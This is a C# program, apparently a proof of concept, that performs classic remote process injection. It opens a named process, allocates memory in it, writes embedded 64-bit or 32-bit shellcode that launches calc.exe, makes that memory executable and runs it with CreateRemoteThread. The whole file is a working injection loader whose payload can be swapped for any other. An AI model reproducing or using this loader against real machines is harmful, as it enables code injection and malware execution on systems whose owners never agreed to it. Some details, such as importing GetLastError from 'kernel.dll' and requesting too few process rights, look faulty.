using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

//Works on self and notepad.exe
//VirtualAlloc, Writes, VirtualProtect and then createsRemoteThread with shellcode
// Make sure to change CPU to x64 bit to run 64bit shellcode, default is Any CPU which compiles as x32bit

namespace Simple_Injection
{
    class Program
    {

        [DllImport("kernel.dll")]
        private static extern uint GetLastError();

        [DllImport("kernel32.dll")]
        private static extern bool IsWow64Process(
            [In] IntPtr hProcess,
            [Out] out bool lpSystemInfo);


        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(
            ProcessAccessFlags dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId
        );

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint dwSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            uint size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocEx(
           IntPtr hHandle,
           IntPtr lpStartAddr,
           uint size,
           UInt32 flAllocationType,
           UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(
           IntPtr hProcess,
           IntPtr lpAddress,
           int dwSize,
           uint flNewProtect,
           out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParamter,
            uint dwCreationFlags,
            out uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(
            IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        private enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }
        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection : uint
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PROCESS_ALL_ACCESS = 0x1F0FFF
        }

        static void Main(string[] args)
        {
            Console.WriteLine("Enter your Process Name");
            string val = Console.ReadLine();
            IntPtr hProcess = GetProcess(val);
            IntPtr hThread;

            byte[] shellcode64 = new byte[276] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x00 };


            byte[] shellcode32 = new byte[193] {
0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };



            bool value;
            

            value = Is64Bit(hProcess);

            Byte[] shellcode;
            Console.WriteLine("IsWow64Process  " + value);

            if (value)
            {
                Console.WriteLine("x64 process");
                shellcode = shellcode64;
            }
            else
            {
                Console.WriteLine("x86 process");
                shellcode = shellcode32;
            }

            //Allocate Space for the shellcode in the process
            IntPtr funcAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, (uint)StateEnum.MEM_COMMIT, (uint)Protection.PAGE_READWRITE);

            Console.WriteLine("Function address: " + funcAddr);

            UIntPtr bytesWritten;
            //Write the Shellcode to the Process
            WriteProcessMemory(hProcess, funcAddr, shellcode, (uint)shellcode.Length, out bytesWritten);

            uint temp = 0;
            bool resultVP = VirtualProtectEx(hProcess, funcAddr, shellcode.Length, (uint)Protection.PAGE_EXECUTE_READ, out temp);

            //Execute
            uint lpThreadId;
            hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, out lpThreadId);
            Console.WriteLine("[+] Thread ID: " + lpThreadId);

            Console.WriteLine("Pause");


            if (hThread != IntPtr.Zero)
            {
                Console.WriteLine("Injection Successful");
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            else
            {
                Console.WriteLine("Injection failed");
            }

        }
        public static bool Is64Bit(IntPtr process)
        {

            if (IntPtr.Size == 4) //32 bit machine, therefore process must be 32 bit
            {
                return false;
            }
            else if (IntPtr.Size == 8) //64-bit machine, therefore need to check if it is a 32bit running on 64 or 64 running on 64bit
            {
                bool value;
                IsWow64Process(process, out value);

                if (value) //if it is a Wow64 process, then it is 32-bit as we are on a 64bit system
                {
                    return false;
                }
                else //if 64 process on 64 bit system then true
                {
                    return true;
                }
            }
           return false;
        }
        static IntPtr GetProcess(string s)
        {
            try
            {
                Process proc = Process.GetProcessesByName(s)[0];
                IntPtr windowHandle = OpenProcess(ProcessAccessFlags.VirtualMemoryOperation | ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite, false, proc.Id);
                return windowHandle;
            }
            catch (IndexOutOfRangeException)
            {
                return GetCurrentProcess();
            }

        }

    }
}

